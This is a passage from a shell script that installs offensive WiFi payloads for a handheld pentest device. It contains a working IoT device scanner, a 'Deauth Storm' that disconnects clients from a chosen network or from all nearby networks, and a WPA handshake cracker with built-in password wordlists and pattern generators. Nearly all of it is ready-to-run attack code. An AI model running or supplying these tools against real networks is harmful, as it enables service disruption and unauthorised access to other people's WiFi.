74:DA:38:EZVIZ
8C:7A:15:Roku
B0:A7:B9:Roku
DC:3A:5E:Roku
D8:31:34:Roku
14:91:82:Belkin_WeMo
C4:41:1E:Belkin
60:3C:92:Wyze
2C:AA:8E:Wyze
7C:78:B2:Wyze
AC:ED:5C:Insteon
D0:73:D5:LiFX
00:22:6D:August_Lock
38:B1:DB:August_Lock
F0:45:DA:SmartThings"

IOT_SSIDS="RING-|Ring-|NEST-|Nest-|Wyze|ECHO-|echo-|SmartThings|HUE-|Philips|WeMo|DIRECTV|Roku|Fire-TV|Amazon-|LIFX|Sonos"

PROMPT "SCAN MODE:

1. Passive WiFi scan
2. Combined scan

Passive = stealth
Combined = thorough

Select on next screen."

SCAN_MODE=$(NUMBER_PICKER "Mode (1-2):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SCAN_MODE=1 ;; esac

DURATION=$(NUMBER_PICKER "Scan duration (sec):" 20)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=20 ;; esac

resp=$(CONFIRMATION_DIALOG "START IOT SCAN?

Mode: $SCAN_MODE
Duration: ${DURATION}s

Press OK to scan.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

echo "IoT Scanner Results" > "$LOOT_FILE"
echo "Date: $(date)" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

FOUND=0

# Use existing monitor interface
MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

SPINNER_START "Scanning for IoT devices..."

TEMP_DIR="/tmp/iotscan_$$"
mkdir -p "$TEMP_DIR"
rm -f /tmp/iotscan_*
timeout "$DURATION" airodump-ng "$MON_IF" -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
sleep "$DURATION"
killall airodump-ng 2>/dev/null

SPINNER_STOP

if [ -f "$TEMP_DIR/scan-01.csv" ]; then
    while IFS=',' read -r BSSID F2 F3 CHANNEL F5 F6 F7 F8 F9 POWER F11 F12 F13 ESSID REST; do
        BSSID=$(echo "$BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
        ESSID=$(echo "$ESSID" | sed 's/^[[:space:]]*//')

        [[ ! "$BSSID" =~ ^[0-9A-Fa-f]{2}: ]] && continue

        OUI=$(echo "$BSSID" | cut -d':' -f1-3)
        DEVICE_TYPE=""

        # Check OUI - use exact prefix matching
        MATCH=$(echo "$IOT_OUIS" | grep -i "^$OUI" | head -1)
        if [ -n "$MATCH" ]; then
            DEVICE_TYPE=$(echo "$MATCH" | awk -F: '{print $4}')
        fi

        # Check SSID
        if [ -z "$DEVICE_TYPE" ] && [ -n "$ESSID" ] && echo "$ESSID" | grep -qiE "$IOT_SSIDS"; then
            DEVICE_TYPE="IoT_SSID_Match"
        fi

        if [ -n "$DEVICE_TYPE" ]; then
            echo "" >> "$LOOT_FILE"
            echo "IoT Device: $DEVICE_TYPE" >> "$LOOT_FILE"
            echo "  MAC: $BSSID" >> "$LOOT_FILE"
            echo "  SSID: $ESSID" >> "$LOOT_FILE"
            echo "  Channel: $(echo $CHANNEL | tr -d ' ')" >> "$LOOT_FILE"
            echo "  Signal: $(echo $POWER | tr -d ' ') dBm" >> "$LOOT_FILE"
            FOUND=$((FOUND + 1))
        fi
    done < "$TEMP_DIR/scan-01.csv"
fi

rm -rf "$TEMP_DIR"

PROMPT "IOT SCAN COMPLETE

IoT devices found: $FOUND

Results: $LOOT_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 7. DeauthStorm - Fix brace expansion, ALL mode channel hop, cleanup
##############################################################################
cat > "$SUITE_DIR/DeauthStorm/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: NullSec Deauth Storm
# Author: bad-antics
# Description: Targeted deauthentication attack with network selection
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR/captures" "$LOOT_DIR/logs"

PROMPT "NULLSEC DEAUTH STORM

WiFi deauthentication attack
to disconnect clients.

Features:
- Network scanning
- Target selection
- Capture mode option
- ALL networks mode

Press OK to scan."

# Detect monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done

if [ -z "$MONITOR_IF" ]; then
    ERROR_DIALOG "No monitor interface!

Run: airmon-ng start wlan1"
    exit 1
fi

LOG "Interface: $MONITOR_IF"

SPINNER_START "Scanning networks..."
rm -f /tmp/deauth_scan*
timeout 15 airodump-ng "$MONITOR_IF" -w /tmp/deauth_scan --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

declare -a BSSIDS CHANNELS ESSIDS
idx=0

if [ -f /tmp/deauth_scan-01.csv ]; then
    while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
        bssid=$(echo "$bssid" | tr -d ' ')
        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue

        essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
        [ -z "$essid" ] && essid="[Hidden]"

        BSSIDS[$idx]="$bssid"
        CHANNELS[$idx]=$(echo "$channel" | tr -d ' ')
        ESSIDS[$idx]="$essid"
        idx=$((idx + 1))
        [ $idx -ge 10 ] && break
    done < /tmp/deauth_scan-01.csv
fi

if [ $idx -eq 0 ]; then
    ERROR_DIALOG "No networks found!"
    rm -f /tmp/deauth_scan*
    exit 1
fi

PROMPT "Found $idx networks:

$(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${ESSIDS[$i]}"; done)

0 = ALL NETWORKS
Enter number next."

TARGET=$(NUMBER_PICKER "Target (0-$idx):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) rm -f /tmp/deauth_scan*; exit 0 ;; esac

if [ "$TARGET" -eq 0 ]; then
    TARGET_BSSID="FF:FF:FF:FF:FF:FF"
    TARGET_ESSID="ALL NETWORKS"
    TARGET_CHANNEL="all"
else
    TARGET=$((TARGET - 1))
    [ $TARGET -lt 0 ] && TARGET=0
    [ $TARGET -ge $idx ] && TARGET=$((idx - 1))
    TARGET_BSSID="${BSSIDS[$TARGET]}"
    TARGET_CHANNEL="${CHANNELS[$TARGET]}"
    TARGET_ESSID="${ESSIDS[$TARGET]}"
fi

DURATION=$(NUMBER_PICKER "Duration (seconds):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac
[ "$DURATION" -lt 5 ] && DURATION=5
[ "$DURATION" -gt 300 ] && DURATION=300

CAPTURE_MODE=""
resp=$(CONFIRMATION_DIALOG "Enable capture mode?

Saves packets for handshake
analysis after attack.")
[ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ] && CAPTURE_MODE="1"

resp=$(CONFIRMATION_DIALOG "ATTACK: $TARGET_ESSID

Duration: ${DURATION}s
Capture: $([ -n "$CAPTURE_MODE" ] && echo YES || echo NO)

START ATTACK?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f /tmp/deauth_scan*; exit 0; }

LOG "Attacking $TARGET_ESSID"

if [ -n "$CAPTURE_MODE" ] && [ "$TARGET_CHANNEL" != "all" ]; then
    SAFE_ESSID=$(echo "$TARGET_ESSID" | tr -cd '[:alnum:]_-')
    CAPFILE="$LOOT_DIR/captures/${SAFE_ESSID}_$(date +%Y%m%d_%H%M%S)"
    iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null
    airodump-ng "$MONITOR_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
        -w "$CAPFILE" --output-format pcap 2>/dev/null &
    CAP_PID=$!
fi

PKTS=0
END=$(($(date +%s) + DURATION))

if [ "$TARGET_CHANNEL" = "all" ]; then
    # ALL NETWORKS: hop channels
    while [ $(date +%s) -lt $END ]; do
        for CH in 1 6 11 2 3 4 5 7 8 9 10; do
            [ $(date +%s) -ge $END ] && break
            iwconfig "$MONITOR_IF" channel $CH 2>/dev/null
            aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF "$MONITOR_IF" 2>/dev/null
            PKTS=$((PKTS + 10))
            sleep 1
        done
    done
else
    iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null
    while [ $(date +%s) -lt $END ]; do
        aireplay-ng -0 10 -a "$TARGET_BSSID" "$MONITOR_IF" 2>/dev/null
        PKTS=$((PKTS + 10))
        sleep 2
    done
fi

killall aireplay-ng airodump-ng 2>/dev/null
rm -f /tmp/deauth_scan*

PROMPT "DEAUTH COMPLETE

Target: $TARGET_ESSID
Packets: ~$PKTS
$([ -n "$CAPFILE" ] && echo "Capture: $CAPFILE")

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# 8. WPACracker - Fix FILE_LIST display, add cleanup, fix CAP_COUNT
##############################################################################
cat > "$SUITE_DIR/WPACracker/payload.sh" << 'PAYLOAD_EOF'
#!/bin/bash
# Title: WPA Cracker
# Author: bad-antics
# Description: Onboard wordlist attack on captured handshakes
# Category: nullsec/crack

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "WPA CRACKER

Crack WPA handshakes
using onboard wordlists.

Includes common passwords
and pattern generators.

Press OK to continue."

# Find .cap files
mapfile -t CAP_ARRAY < <(find /mmc/nullsec -name "*.cap" -type f 2>/dev/null | head -10)
CAP_COUNT=${#CAP_ARRAY[@]}

if [ "$CAP_COUNT" -eq 0 ]; then
    ERROR_DIALOG "No handshakes found!

Capture first with:
HandshakeHunter, AutoPwn,
or Reaper payloads."
    exit 1
fi

# Build file list for display
FILE_LIST=""
for i in $(seq 0 $((CAP_COUNT - 1))); do
    FILE_LIST="${FILE_LIST}$((i+1)). $(basename "${CAP_ARRAY[$i]}")\n"
done

PROMPT "CAPTURES: $CAP_COUNT

$(echo -e "$FILE_LIST")
Select file to crack."

FILE_NUM=$(NUMBER_PICKER "File # (1-$CAP_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
[ "$FILE_NUM" -lt 1 ] && FILE_NUM=1
[ "$FILE_NUM" -gt "$CAP_COUNT" ] && FILE_NUM=$CAP_COUNT
TARGET_FILE="${CAP_ARRAY[$((FILE_NUM - 1))]}"

# Verify it has a handshake
if ! aircrack-ng "$TARGET_FILE" 2>/dev/null | grep -q "1 handshake"; then
    resp=$(CONFIRMATION_DIALOG "No handshake in file!

Try cracking anyway?
(May not succeed)")
    [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
fi

PROMPT "WORDLIST:

1. Common passwords (fast)
2. Extended wordlist
3. Pattern attack
4. Custom wordlist path

Select on next screen."

WORDLIST_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) WORDLIST_MODE=1 ;; esac

WORDLIST=""
case $WORDLIST_MODE in
    1)
        WORDLIST="/tmp/wpa_common.txt"
        # WPA passwords must be 8+ chars
        cat > "$WORDLIST" << 'COMMONWORDS'
password
12345678
password1
123456789
qwerty123
password123
1234567890
letmein123
welcome123
admin1234
monkey123
dragon123
master123
login1234
princess1
sunshine1
iloveyou1
trustno1!
00000000
football1
shadow123
superman1
michael123
ninja1234
mustang123
password12
password01
qwertyuiop
1q2w3e4r5t
admin12345
welcome1234
changeme123
COMMONWORDS
        ;;
    2)
        WORDLIST="/tmp/wpa_extended.txt"
        > "$WORDLIST"
        for year in 2020 2021 2022 2023 2024 2025; do
            echo "password$year" >> "$WORDLIST"
            echo "${year}${year}" >> "$WORDLIST"
        done
        for word in love life home work wifi network admin guest hello world; do
            echo "${word}1234" >> "$WORDLIST"
            echo "${word}12345" >> "$WORDLIST"
            echo "${word}!234" >> "$WORDLIST"
        done
        for base in password qwerty letmein welcome; do
            for suf in 1 12 123 1234 12345 "!" "@" "#"; do
                combo="${base}${suf}"
                [ ${#combo} -ge 8 ] && echo "$combo" >> "$WORDLIST"
            done
        done
        ;;
    3)
        PROMPT "PATTERN ATTACK:

Enter base word for
password variations.

Example: company name,
pet name, city, etc."

        BASE_WORD=$(TEXT_PICKER "Base word:" "password")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) BASE_WORD="password" ;; esac
        WORDLIST="/tmp/wpa_pattern.txt"
        > "$WORDLIST"
        for suf in "" 1 12 123 1234 12345 "!" "@" "#" "!!" "123!" "1234!"; do
            combo="${BASE_WORD}${suf}"
            [ ${#combo} -ge 8 ] && echo "$combo" >> "$WORDLIST"
        done
        for year in 2020 2021 2022 2023 2024 2025; do
            combo="${BASE_WORD}${year}"
            [ ${#combo} -ge 8 ] && echo "$combo" >> "$WORDLIST"
        done
        # Capitalized variants
        UPPER_FIRST="${BASE_WORD^}"
        ALL_UPPER="${BASE_WORD^^}"
        for w in "$UPPER_FIRST" "$ALL_UPPER"; do
            for suf in "" 1 123 1234 "!" "123!"; do
                combo="${w}${suf}"
                [ ${#combo} -ge 8 ] && echo "$combo" >> "$WORDLIST"
            done
        done
        ;;
    4)
        WORDLIST=$(TEXT_PICKER "Wordlist path:" "/mmc/wordlists/rockyou.txt")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
        [ ! -f "$WORDLIST" ] && { ERROR_DIALOG "Wordlist not found:\n$WORDLIST"; exit 1; }
        ;;
esac

WORD_COUNT=$(wc -l < "$WORDLIST" 2>/dev/null || echo 0)

resp=$(CONFIRMATION_DIALOG "START CRACKING?

File: $(basename "$TARGET_FILE")
Words: $WORD_COUNT

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Cracking with $WORD_COUNT words..."
SPINNER_START "Cracking..."

RESULT=$(aircrack-ng -w "$WORDLIST" "$TARGET_FILE" 2>/dev/null)

SPINNER_STOP

# Cleanup temp wordlists
rm -f /tmp/wpa_common.txt /tmp/wpa_extended.txt /tmp/wpa_pattern.txt

if echo "$RESULT" | grep -q "KEY FOUND"; then
    KEY=$(echo "$RESULT" | grep "KEY FOUND" | sed 's/.*\[ \(.*\) \].*/\1/')

    echo "$(date) | $(basename "$TARGET_FILE") | $KEY" >> "$LOOT_DIR/cracked.txt"

    PROMPT "PASSWORD FOUND!

$KEY

Saved to cracked.txt

Press OK to exit."
else
    PROMPT "NO MATCH FOUND

Password not in wordlist.

Try:
- Different wordlist
- Pattern attack
- Larger wordlist file

Press OK to exit."
fi
PAYLOAD_EOF
FIXED=$((FIXED + 1))

echo ""
echo "═══════════════════════════════════════════════"
echo "  PART 2 FIX COMPLETE"
echo "  Fixed: $FIXED payloads"
echo "═══════════════════════════════════════════════"
